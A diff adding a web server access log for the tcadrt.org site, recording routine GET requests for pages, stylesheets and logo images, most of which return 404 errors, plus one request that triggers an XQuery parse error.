@@ -1,0 +1,827 @@
+00:02:07.143	222.186.34.122:3283	admin	REQUEST	[GET] http://207.58.154.226:8080/script
+00:02:07.194	222.186.34.122:3283	admin	400	Stopped at /opt/tomcat/webapps/ROOT/content.xqm, 21/1: [XPST0003] Expecting '>', found '<'.	51.48 ms
+00:08:45.264	129.59.122.19:27149	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/
+00:08:45.298	129.59.122.19:27149	admin	400	Stopped at /opt/tomcat/webapps/ROOT/content.xqm, 21/1: [XPST0003] Expecting '>', found '<'.	34.83 ms
+00:10:14.092	129.59.122.19:42459	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/
+00:10:14.559	129.59.122.19:42459	admin	200		467.39 ms
+00:10:14.625	129.59.122.19:42459	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/css/tcadrt.css
+00:10:14.625	129.59.122.19:42459	admin	404	No function found that matches the request.	0.9 ms
+00:10:14.675	129.59.122.19:42459	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/neh-logo.png
+00:10:14.675	129.59.122.19:42459	admin	404	No function found that matches the request.	0.7 ms
+00:10:14.705	129.59.122.19:12670	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/heard-library-logo.png
+00:10:14.705	129.59.122.19:12670	admin	404	No function found that matches the request.	0.71 ms
+00:10:14.725	129.59.122.19:42459	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/gf-logo.png
+00:10:14.725	129.59.122.19:42459	admin	404	No function found that matches the request.	0.77 ms
+00:10:14.748	129.59.122.19:23490	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/vanderbilt-cas-logo.png
+00:10:14.749	129.59.122.19:23490	admin	404	No function found that matches the request.	0.73 ms
+00:10:14.750	129.59.122.19:12513	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/hart-logo.png
+00:10:14.751	129.59.122.19:12513	admin	404	No function found that matches the request.	0.7 ms
+00:11:13.085	129.59.122.19:44515	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/
+00:11:13.339	129.59.122.19:44515	admin	200		254.74 ms
+00:11:13.414	129.59.122.19:44515	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/css/tcadrt.css
+00:11:13.414	129.59.122.19:44515	admin	404	No function found that matches the request.	0.75 ms
+00:11:13.464	129.59.122.19:23401	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/neh-logo.png
+00:11:13.464	129.59.122.19:23401	admin	404	No function found that matches the request.	0.72 ms
+00:11:13.490	129.59.122.19:44515	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/heard-library-logo.png
+00:11:13.490	129.59.122.19:44515	admin	404	No function found that matches the request.	0.76 ms
+00:11:13.515	129.59.122.19:23401	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/gf-logo.png
+00:11:13.515	129.59.122.19:23401	admin	404	No function found that matches the request.	0.74 ms
+00:11:13.534	129.59.122.19:11675	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/hart-logo.png
+00:11:13.535	129.59.122.19:41552	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/vanderbilt-cas-logo.png
+00:11:13.535	129.59.122.19:41552	admin	404	No function found that matches the request.	1.69 ms
+00:11:13.536	129.59.122.19:11675	admin	404	No function found that matches the request.	1.73 ms
+00:11:30.840	129.59.122.19:23702	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:11:30.874	129.59.122.19:18117	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:11:30.876	129.59.122.19:52244	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:11:30.878	129.59.122.19:24329	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:11:30.877	129.59.122.19:36354	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:11:30.878	129.59.122.19:36081	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:11:30.888	129.59.122.19:36081	admin	404	No function found that matches the request.	10.2 ms
+00:11:30.889	129.59.122.19:52244	admin	404	No function found that matches the request.	13.66 ms
+00:11:30.890	129.59.122.19:36354	admin	404	No function found that matches the request.	13.68 ms
+00:11:30.891	129.59.122.19:18117	admin	404	No function found that matches the request.	17.04 ms
+00:11:30.892	129.59.122.19:24329	admin	404	No function found that matches the request.	14.43 ms
+00:11:30.893	129.59.122.19:23702	admin	404	No function found that matches the request.	53.41 ms
+00:12:20.796	129.59.122.19:12968	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:12:20.859	129.59.122.19:12968	admin	404	No function found that matches the request.	63.72 ms
+00:12:21.464	129.59.122.19:12968	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:12:21.465	129.59.122.19:12968	admin	404	No function found that matches the request.	0.85 ms
+00:12:27.021	129.59.122.19:12968	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:12:27.080	129.59.122.19:12968	admin	404	No function found that matches the request.	58.78 ms
+00:12:28.169	129.59.122.19:12968	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:12:28.169	129.59.122.19:12968	admin	404	No function found that matches the request.	0.81 ms
+00:14:19.967	129.59.122.19:20008	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/
+00:14:20.195	129.59.122.19:20008	admin	200		228.16 ms
+00:14:20.271	129.59.122.19:20008	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/css/tcadrt.css
+00:14:20.271	129.59.122.19:20008	admin	404	No function found that matches the request.	0.71 ms
+00:14:20.320	129.59.122.19:20008	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/neh-logo.png
+00:14:20.321	129.59.122.19:20008	admin	404	No function found that matches the request.	0.66 ms
+00:14:20.368	129.59.122.19:37571	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/heard-library-logo.png
+00:14:20.368	129.59.122.19:37571	admin	404	No function found that matches the request.	0.59 ms
+00:14:20.370	129.59.122.19:20008	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/gf-logo.png
+00:14:20.370	129.59.122.19:20008	admin	404	No function found that matches the request.	0.63 ms
+00:14:20.412	129.59.122.19:18411	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/vanderbilt-cas-logo.png
+00:14:20.412	129.59.122.19:18411	admin	404	No function found that matches the request.	0.6 ms
+00:14:20.413	129.59.122.19:50187	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/hart-logo.png
+00:14:20.414	129.59.122.19:50187	admin	404	No function found that matches the request.	0.62 ms
+00:14:40.541	129.59.122.19:11318	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:14:40.679	129.59.122.19:11318	admin	200		138.23 ms
+00:14:40.747	129.59.122.19:11318	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:14:40.748	129.59.122.19:11318	admin	404	No function found that matches the request.	0.73 ms
+00:14:40.797	129.59.122.19:11318	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:14:40.798	129.59.122.19:11318	admin	404	No function found that matches the request.	0.75 ms
+00:14:40.811	129.59.122.19:29579	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:14:40.811	129.59.122.19:29579	admin	404	No function found that matches the request.	0.72 ms
+00:14:40.812	129.59.122.19:37453	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:14:40.812	129.59.122.19:37453	admin	404	No function found that matches the request.	0.58 ms
+00:14:40.813	129.59.122.19:17903	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:14:40.814	129.59.122.19:17903	admin	404	No function found that matches the request.	0.76 ms
+00:14:40.815	129.59.122.19:10642	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:14:40.815	129.59.122.19:10642	admin	404	No function found that matches the request.	0.72 ms
+00:14:48.850	129.59.122.19:10642	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:14:48.953	129.59.122.19:10642	admin	404	No function found that matches the request.	104.13 ms
+00:15:42.619	129.59.122.19:4494	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:15:42.658	129.59.122.19:4494	admin	404	No function found that matches the request.	38.81 ms
+00:17:03.519	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:17:03.563	129.59.122.19:34761	admin	404	No function found that matches the request.	44.78 ms
+00:17:04.406	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:17:04.407	129.59.122.19:34761	admin	404	No function found that matches the request.	0.77 ms
+00:17:10.786	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:17:10.847	129.59.122.19:34761	admin	404	No function found that matches the request.	61.89 ms
+00:17:22.525	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/index.html
+00:17:22.573	129.59.122.19:34761	admin	404	No function found that matches the request.	47.99 ms
+00:17:32.683	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/home/
+00:17:32.729	129.59.122.19:34761	admin	404	No function found that matches the request.	46.38 ms
+00:17:37.300	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:17:37.349	129.59.122.19:34761	admin	404	No function found that matches the request.	49.3 ms
+00:17:38.911	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:17:39.308	129.59.122.19:34761	admin	200		397.71 ms
+00:17:39.376	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:17:39.377	129.59.122.19:34761	admin	404	No function found that matches the request.	0.73 ms
+00:17:39.429	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:17:39.429	129.59.122.19:34761	admin	404	No function found that matches the request.	0.65 ms
+00:17:39.434	129.59.122.19:22697	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:17:39.434	129.59.122.19:22697	admin	404	No function found that matches the request.	0.58 ms
+00:17:39.435	129.59.122.19:52243	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:17:39.436	129.59.122.19:52243	admin	404	No function found that matches the request.	0.61 ms
+00:17:39.478	129.59.122.19:34761	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:17:39.479	129.59.122.19:34761	admin	404	No function found that matches the request.	0.61 ms
+00:17:39.480	129.59.122.19:1517	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:17:39.480	129.59.122.19:1517	admin	404	No function found that matches the request.	0.57 ms
+00:17:46.126	129.59.122.19:1517	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:17:46.153	129.59.122.19:1517	admin	404	No function found that matches the request.	27.05 ms
+00:25:38.275	129.59.122.19:49606	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:25:38.351	129.59.122.19:49606	admin	404	No function found that matches the request.	75.66 ms
+00:25:44.454	129.59.122.19:49606	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:25:44.520	129.59.122.19:49606	admin	404	No function found that matches the request.	65.57 ms
+00:28:06.282	129.59.122.19:25649	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:28:06.323	129.59.122.19:25649	admin	404	No function found that matches the request.	41.14 ms
+00:28:21.159	129.59.122.19:12173	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/
+00:28:22.037	129.59.122.19:12173	admin	200		878.12 ms
+00:28:22.136	129.59.122.19:12173	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/css/tcadrt.css
+00:28:22.136	129.59.122.19:12173	admin	404	No function found that matches the request.	0.77 ms
+00:28:22.146	129.59.122.19:32235	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/neh-logo.png
+00:28:22.146	129.59.122.19:32235	admin	404	No function found that matches the request.	0.77 ms
+00:28:22.199	129.59.122.19:32235	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/heard-library-logo.png
+00:28:22.199	129.59.122.19:32235	admin	404	No function found that matches the request.	0.61 ms
+00:28:22.239	129.59.122.19:30029	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/vanderbilt-cas-logo.png
+00:28:22.239	129.59.122.19:30029	admin	404	No function found that matches the request.	0.58 ms
+00:28:22.241	129.59.122.19:8901	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/hart-logo.png
+00:28:22.241	129.59.122.19:8901	admin	404	No function found that matches the request.	0.61 ms
+00:28:22.242	129.59.122.19:12173	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/gf-logo.png
+00:28:22.243	129.59.122.19:12173	admin	404	No function found that matches the request.	0.58 ms
+00:28:32.959	129.59.122.19:12173	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/tool
+00:28:33.121	129.59.122.19:12173	admin	200		162.63 ms
+00:28:33.187	129.59.122.19:12173	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/css/tcadrt.css
+00:28:33.187	129.59.122.19:12173	admin	404	No function found that matches the request.	0.47 ms
+00:28:33.191	129.59.122.19:8901	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/tool-image.jpg
+00:28:33.192	129.59.122.19:8901	admin	404	No function found that matches the request.	0.33 ms
+00:28:33.243	129.59.122.19:8901	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/neh-logo.png
+00:28:33.243	129.59.122.19:8901	admin	404	No function found that matches the request.	0.46 ms
+00:28:33.294	129.59.122.19:30029	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/gf-logo.png
+00:28:33.294	129.59.122.19:30029	admin	404	No function found that matches the request.	0.64 ms
+00:28:33.295	129.59.122.19:30153	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/hart-logo.png
+00:28:33.296	129.59.122.19:30153	admin	404	No function found that matches the request.	0.47 ms
+00:28:33.297	129.59.122.19:12173	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/heard-library-logo.png
+00:28:33.297	129.59.122.19:12173	admin	404	No function found that matches the request.	0.46 ms
+00:28:33.298	129.59.122.19:32235	admin	REQUEST	[GET] http://tcadrt.jelastic.servint.net/img/vanderbilt-cas-logo.png
+00:28:33.298	129.59.122.19:32235	admin	404	No function found that matches the request.	0.44 ms
+00:28:53.903	129.59.122.19:11302	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:28:54.249	129.59.122.19:11302	admin	200		346.33 ms
+00:28:54.411	129.59.122.19:11302	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:28:54.411	129.59.122.19:11302	admin	404	No function found that matches the request.	0.54 ms
+00:28:54.419	129.59.122.19:51501	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:28:54.419	129.59.122.19:51501	admin	404	No function found that matches the request.	0.41 ms
+00:28:54.470	129.59.122.19:51501	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:28:54.470	129.59.122.19:51501	admin	404	No function found that matches the request.	0.37 ms
+00:28:54.507	129.59.122.19:11302	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:28:54.507	129.59.122.19:11302	admin	404	No function found that matches the request.	0.4 ms
+00:28:54.519	129.59.122.19:51501	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:28:54.519	129.59.122.19:51501	admin	404	No function found that matches the request.	0.37 ms
+00:28:54.551	129.59.122.19:11051	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:28:54.551	129.59.122.19:11051	admin	404	No function found that matches the request.	0.37 ms
+00:28:54.552	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:28:54.552	129.59.122.19:42991	admin	404	No function found that matches the request.	0.37 ms
+00:28:58.766	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:28:58.885	129.59.122.19:42991	admin	200		119.1 ms
+00:28:58.951	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:28:58.952	129.59.122.19:42991	admin	404	No function found that matches the request.	0.7 ms
+00:28:58.955	129.59.122.19:11051	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:28:58.955	129.59.122.19:11051	admin	404	No function found that matches the request.	0.51 ms
+00:28:59.007	129.59.122.19:11051	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:28:59.007	129.59.122.19:11051	admin	404	No function found that matches the request.	0.57 ms
+00:28:59.056	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:28:59.057	129.59.122.19:19147	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:28:59.057	129.59.122.19:19147	admin	404	No function found that matches the request.	0.49 ms
+00:28:59.058	129.59.122.19:11302	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:28:59.059	129.59.122.19:11302	admin	404	No function found that matches the request.	0.5 ms
+00:28:59.060	129.59.122.19:51501	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:28:59.060	129.59.122.19:51501	admin	404	No function found that matches the request.	0.51 ms
+00:28:59.061	129.59.122.19:42991	admin	404	No function found that matches the request.	4.71 ms
+00:28:59.412	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+00:28:59.412	129.59.122.19:42991	admin	404	No function found that matches the request.	0.66 ms
+00:29:04.376	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:29:04.516	129.59.122.19:42991	admin	200		140.26 ms
+00:29:04.591	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:29:04.592	129.59.122.19:42991	admin	404	No function found that matches the request.	0.76 ms
+00:29:04.595	129.59.122.19:51501	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:29:04.596	129.59.122.19:51501	admin	404	No function found that matches the request.	0.63 ms
+00:29:04.647	129.59.122.19:51501	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:29:04.647	129.59.122.19:51501	admin	404	No function found that matches the request.	0.63 ms
+00:29:04.691	129.59.122.19:42991	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:29:04.691	129.59.122.19:42991	admin	404	No function found that matches the request.	0.53 ms
+00:29:04.692	129.59.122.19:11302	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:29:04.692	129.59.122.19:11302	admin	404	No function found that matches the request.	0.31 ms
+00:29:04.693	129.59.122.19:11051	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:29:04.693	129.59.122.19:11051	admin	404	No function found that matches the request.	0.35 ms
+00:29:04.694	129.59.122.19:19147	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:29:04.695	129.59.122.19:19147	admin	404	No function found that matches the request.	0.34 ms
+00:29:10.308	129.59.122.19:19147	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:29:10.343	129.59.122.19:19147	admin	404	No function found that matches the request.	35.75 ms
+00:34:32.606	129.59.122.19:45737	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:34:32.680	129.59.122.19:45737	admin	404	No function found that matches the request.	74.3 ms
+00:34:34.874	129.59.122.19:45737	admin	REQUEST	[GET] http://tcadrt.org/gom/
+00:34:34.874	129.59.122.19:45737	admin	404	No function found that matches the request.	0.47 ms
+00:35:14.393	129.59.122.19:27735	admin	REQUEST	[GET] http://tcadrt.org/gom/tool
+00:35:14.459	129.59.122.19:27735	admin	404	No function found that matches the request.	65.97 ms
+00:35:20.634	129.59.122.19:27735	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:35:26.152	129.59.122.19:27735	admin	200		5518.31 ms
+00:35:26.216	129.59.122.19:27735	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:35:26.250	129.59.122.19:27735	admin	404	No function found that matches the request.	34.11 ms
+00:35:26.267	129.59.122.19:41788	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:35:26.267	129.59.122.19:41788	admin	404	No function found that matches the request.	0.33 ms
+00:35:26.315	129.59.122.19:41788	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:35:26.315	129.59.122.19:41788	admin	404	No function found that matches the request.	0.38 ms
+00:35:26.344	129.59.122.19:27735	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:35:26.344	129.59.122.19:27735	admin	404	No function found that matches the request.	0.33 ms
+00:35:26.363	129.59.122.19:41788	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:35:26.363	129.59.122.19:41788	admin	404	No function found that matches the request.	0.33 ms
+00:35:26.393	129.59.122.19:42460	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:35:26.393	129.59.122.19:42460	admin	404	No function found that matches the request.	0.32 ms
+00:35:26.394	129.59.122.19:30743	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:35:26.394	129.59.122.19:30743	admin	404	No function found that matches the request.	0.32 ms
+00:35:38.683	129.59.122.19:46598	admin	REQUEST	[GET] http://www.tcadrt.org/
+00:35:38.800	129.59.122.19:46598	admin	200		116.77 ms
+00:35:38.866	129.59.122.19:46598	admin	REQUEST	[GET] http://www.tcadrt.org/css/tcadrt.css
+00:35:38.866	129.59.122.19:46598	admin	404	No function found that matches the request.	0.38 ms
+00:35:38.868	129.59.122.19:3945	admin	REQUEST	[GET] http://www.tcadrt.org/js/tang-song.js
+00:35:38.868	129.59.122.19:3945	admin	404	No function found that matches the request.	0.34 ms
+00:35:38.920	129.59.122.19:46598	admin	REQUEST	[GET] http://www.tcadrt.org/img/tcadrt-logo-vs.png
+00:35:38.920	129.59.122.19:46598	admin	404	No function found that matches the request.	0.33 ms
+00:35:38.969	129.59.122.19:46598	admin	REQUEST	[GET] http://www.tcadrt.org/img/Lingyansi-medium.jpg
+00:35:38.969	129.59.122.19:46598	admin	404	No function found that matches the request.	0.33 ms
+00:35:38.973	129.59.122.19:3945	admin	REQUEST	[GET] http://www.tcadrt.org/img/neh-logo.png
+00:35:38.973	129.59.122.19:3945	admin	404	No function found that matches the request.	0.32 ms
+00:35:39.022	129.59.122.19:22894	admin	REQUEST	[GET] http://www.tcadrt.org/img/vanderbilt-cas-logo.png
+00:35:39.022	129.59.122.19:22894	admin	404	No function found that matches the request.	0.38 ms
+00:35:39.023	129.59.122.19:32291	admin	REQUEST	[GET] http://www.tcadrt.org/img/heard-library-logo.png
+00:35:39.024	129.59.122.19:32291	admin	404	No function found that matches the request.	0.33 ms
+00:35:39.024	129.59.122.19:36633	admin	REQUEST	[GET] http://www.tcadrt.org/img/gf-logo.png
+00:35:39.024	129.59.122.19:36633	admin	404	No function found that matches the request.	0.28 ms
+00:35:39.030	129.59.122.19:8661	admin	REQUEST	[GET] http://www.tcadrt.org/img/hart-logo.png
+00:35:39.030	129.59.122.19:8661	admin	404	No function found that matches the request.	0.36 ms
+00:36:28.231	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/
+00:36:29.175	129.59.122.19:20475	admin	200		944.28 ms
+00:36:29.235	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:36:29.235	129.59.122.19:20475	admin	404	No function found that matches the request.	0.47 ms
+00:36:29.236	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:36:29.236	129.59.122.19:42383	admin	404	No function found that matches the request.	0.32 ms
+00:36:29.328	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:36:29.328	129.59.122.19:42383	admin	404	No function found that matches the request.	0.33 ms
+00:36:29.377	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:36:29.377	129.59.122.19:42383	admin	404	No function found that matches the request.	0.34 ms
+00:36:29.397	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:36:29.397	129.59.122.19:20475	admin	404	No function found that matches the request.	0.33 ms
+00:36:29.426	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:36:29.426	129.59.122.19:42383	admin	404	No function found that matches the request.	0.32 ms
+00:36:29.446	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:36:29.447	129.59.122.19:20475	admin	404	No function found that matches the request.	0.38 ms
+00:36:29.475	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:36:29.475	129.59.122.19:42383	admin	404	No function found that matches the request.	0.35 ms
+00:36:29.492	129.59.122.19:13795	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:36:29.492	129.59.122.19:13795	admin	404	No function found that matches the request.	0.34 ms
+00:36:29.493	129.59.122.19:34080	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:36:29.493	129.59.122.19:34080	admin	404	No function found that matches the request.	0.32 ms
+00:36:29.500	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:36:29.501	129.59.122.19:20475	admin	404	No function found that matches the request.	0.35 ms
+00:36:29.491	129.59.122.19:37342	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:36:29.502	129.59.122.19:37342	admin	404	No function found that matches the request.	11.23 ms
+00:36:39.048	129.59.122.19:37342	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:36:39.203	129.59.122.19:37342	admin	200		154.71 ms
+00:36:39.267	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:36:39.267	129.59.122.19:20475	admin	404	No function found that matches the request.	0.44 ms
+00:36:39.269	129.59.122.19:37342	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:36:39.269	129.59.122.19:37342	admin	404	No function found that matches the request.	0.33 ms
+00:36:39.315	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:36:39.315	129.59.122.19:20475	admin	404	No function found that matches the request.	0.37 ms
+00:36:39.344	129.59.122.19:37342	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:36:39.344	129.59.122.19:37342	admin	404	No function found that matches the request.	0.44 ms
+00:36:39.364	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/img/tool-image.jpg
+00:36:39.364	129.59.122.19:20475	admin	404	No function found that matches the request.	0.36 ms
+00:36:39.396	129.59.122.19:37342	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:36:39.396	129.59.122.19:37342	admin	404	No function found that matches the request.	0.36 ms
+00:36:39.397	129.59.122.19:34080	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:36:39.397	129.59.122.19:34080	admin	404	No function found that matches the request.	0.32 ms
+00:36:39.398	129.59.122.19:13795	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:36:39.398	129.59.122.19:13795	admin	404	No function found that matches the request.	0.32 ms
+00:36:39.399	129.59.122.19:14977	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:36:39.399	129.59.122.19:14977	admin	404	No function found that matches the request.	0.32 ms
+00:36:39.400	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:36:39.400	129.59.122.19:42383	admin	404	No function found that matches the request.	0.32 ms
+00:36:39.601	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:36:39.601	129.59.122.19:42383	admin	404	No function found that matches the request.	0.5 ms
+00:36:41.358	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/
+00:36:41.399	129.59.122.19:42383	admin	200		41.07 ms
+00:36:41.465	129.59.122.19:14977	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:36:41.466	129.59.122.19:14977	admin	404	No function found that matches the request.	0.39 ms
+00:36:41.466	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:36:41.466	129.59.122.19:42383	admin	404	No function found that matches the request.	0.29 ms
+00:36:41.515	129.59.122.19:14977	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:36:41.515	129.59.122.19:14977	admin	404	No function found that matches the request.	0.35 ms
+00:36:41.537	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:36:41.538	129.59.122.19:42383	admin	404	No function found that matches the request.	0.36 ms
+00:36:41.564	129.59.122.19:14977	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:36:41.564	129.59.122.19:14977	admin	404	No function found that matches the request.	0.34 ms
+00:36:41.587	129.59.122.19:42383	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:36:41.587	129.59.122.19:42383	admin	404	No function found that matches the request.	0.35 ms
+00:36:41.588	129.59.122.19:13795	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:36:41.588	129.59.122.19:13795	admin	404	No function found that matches the request.	0.44 ms
+00:36:41.589	129.59.122.19:34080	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:36:41.589	129.59.122.19:34080	admin	404	No function found that matches the request.	0.32 ms
